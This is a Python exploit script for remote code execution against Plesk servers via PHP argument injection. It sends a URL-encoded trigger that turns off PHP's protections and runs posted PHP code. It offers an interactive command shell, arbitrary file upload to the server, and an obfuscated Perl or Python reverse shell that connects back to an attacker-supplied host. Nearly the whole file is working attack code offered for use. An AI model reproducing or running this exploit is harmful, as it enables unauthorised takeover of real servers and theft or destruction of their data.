#!/usr/bin/python
#############################
#            ABOUT          #
#############################

##########################################################
# Plesk PHP Inject0r Exploit v1.0                        #
# Greets to kingcope for finding orig. bug :3            #
# Author: WhoAmi                                         #
# Site: Https://www.youtube.com/c/spynet                 #
# Notes: This literally took like 10 minutes to port     #
##########################################################

#############################
#         LIBRARIES         #
#############################
import sys, os
import payloads
from payloads import all
import argparse
import requests
import sys

#############################
#           HELP            #
#############################

help = '''
 

            |         Plesk PHP Inject0r EXPLOIT v1.0              |
            |         Found by : kingcope                          |
            |         Coded by : WhoAMi [CLAYTEAM]                 |
            |         Contact  : SpyneT.Officiell@gmail.com        |
                                                                     '''
parser = argparse.ArgumentParser(description=help)
parser.add_argument("--target",help="Target IP", required=True)
parser.add_argument("--mode ", help="RSH (reverse shell), UP (upload) or SH (inline shell)", default="SH")
parser.add_argument("--lfile", help="File to Upload (full path)")
parser.add_argument("--rfile", help="Where to put the file on the server (full path)")
parser.add_argument("--lhost", help="Host to connect back to", default="127.0.0.1")
parser.add_argument("--lport", help="Port to connect back to", default="4444")
parser.add_argument("--stype", help="Reverse Shell Type - Python or Perl", default="perl")
args = parser.parse_args()

target = args.target
mode = args.mode
localfile = args.lfile
remotefile = args.rfile
lhost = args.lhost
lport = args.lport
stype = args.stype

trigger = "/%70%68%70%70%61%74%68/%70%68%70?"
trigger += "%2D%64+%61%6C%6C%6F%77%5F%75%72%"
trigger += "6C%5F%69%6E%63%6C%75%64%65%3D%6F"
trigger += "%6E+%2D%64+%73%61%66%65%5F%6D%6F"
trigger += "%64%65%3D%6F%66%66+%2D%64+%73%75"
trigger += "%68%6F%73%69%6E%2E%73%69%6D%75%6"
trigger += "C%61%74%69%6F%6E%3D%6F%6E+%2D%64"
trigger += "+%64%69%73%61%62%6C%65%5F%66%75%"
trigger += "6E%63%74%69%6F%6E%73%3D%22%22+%2"
trigger += "D%64+%6F%70%65%6E%5F%62%61%73%65"
trigger += "%64%69%72%3D%6E%6F%6E%65+%2D%64+"
trigger += "%61%75%74%6F%5F%70%72%65%70%65%6"
trigger += "E%64%5F%66%69%6C%65%3D%70%68%70%"
trigger += "3A%2F%2F%69%6E%70%75%74+%2D%6E"


url = "http://" + target + trigger 

def genrshell(lhost, lport, stype):
    if stype == "perl":
        rshell = payloads.linux.perl.reverse_oneline(lhost, lport)
    elif stype == "python":
        rshell = payloads.linux.python.reverse_oneline(lhost, lport)
    return rshell

def genphp(cmd):
    rawphp = """echo "Content-Type:text/html\r\n\r\n"; system('%s');""" %(cmd) # to return results :D
    encodedphp = rawphp.encode('base64')
    payload = """<?php eval(base64_decode('%s'));die(); ?>""" %(encodedphp) # Create a payload
    return payload #return the evil

def genencphp(cmd):
    encoded = cmd.encode('base64')
    encoded = encoded.strip()
    encoded = encoded.replace('\n', '')
    encoded = encoded.encode('base64')
    encoded = encoded.strip()
    encoded = encoded.replace('\n', '') # 
    raw = """system(base64_decode(base64_decode('%s')));""" %(encoded)
    payload = """<?php %s ?>""" %(raw) # Make a bleep bleep
    return payload

def test(url): # This whole function is ugly as sin
    php = """<?php echo "Content-Type:text/html\r\n\r\n"; echo md5('WhoAmi'); ?>""" # I hope they even md5
    WhoAmi = requests.post(url, php) # hahaha no, they dont.
    if "9a74152b6df9f65345be1cbede630897" in WhoAmi.text: # hax0r it na0?
        print "%s vuln!" %(ip) # yes, this ddos number is wide open
    else:
        print "%s not vuln" %(ip)

def shell():
    while True: # because. infinite win
        try: # there is no try, there is only do, and do not...
            cmd = raw_input("sh3ll:~$ ")
            if cmd == "quit": #rip
                print "\n[-] Quitting"
                sys.exit(0)
            elif cmd == "exit": #rip
                print "\n[-] Quitting"
                sys.exit(0)
            else:
                try:
                    payload = genphp(cmd)
                    CLAY = requests.post(url, payload)
                    print CLAY.text
                except Exception or KeyboardInterrupt:
                    print "[-] Exception Caught, I hope"
                    sys.exit(-5)
        except Exception or KeyboardInterrupt:
            print "[-] Exception or CTRL+C Caught, I hope"
            print "[-] Exiting (hopefully) cleanly..."
            sys.exit(0)

def upload(url, localfile, remotefile):
    f = open(localfile, "r")
    rawfiledata = f.read()
    encodedfiledata = rawfiledata.encode('base64')
    phppayload = """<?php
    $f = fopen("%s", "w");
    $x = base64_decode('%s');
    fwrite($f, "$x");
    fclose($f);
    ?>""" %(remotefile, encodedfiledata) # I need to add a hashing function sometime for corruption test.
    print "[+] Uploading File"
    requests.post(url, phppayload) # this is why I love the python requests library
    print "[+] Upload should be complete"
    sys.exit(0)

def rshell():
    rshell = genrshell(lhost, lport, stype)
    print "[+] Generating Payload"
    payload = genencphp(rshell)
    print "[+] Sending reverse shell to %s:%s" %(lhost, lport)
    requests.post(url, payload) # LoL HaCk3d!
    print "[<3] Exiting..."
    sys.exit(0)

def main(target, mode): # Some magics
    print "[+] Target is: %s" %(target)
    if mode == "UP":
        upload(url, localfile, remotefile)
    elif mode == "SH":
        shell()
    elif mode == "RSH":
        rshell()
    else:
        print "[-] Mode Invalid... Exit!"
        sys.exit(0)

main(target, mode)
